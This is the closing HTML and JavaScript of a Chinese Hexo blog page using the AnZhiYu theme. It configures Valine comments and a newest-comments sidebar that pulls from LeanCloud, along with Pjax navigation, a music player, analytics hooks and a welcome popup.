      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>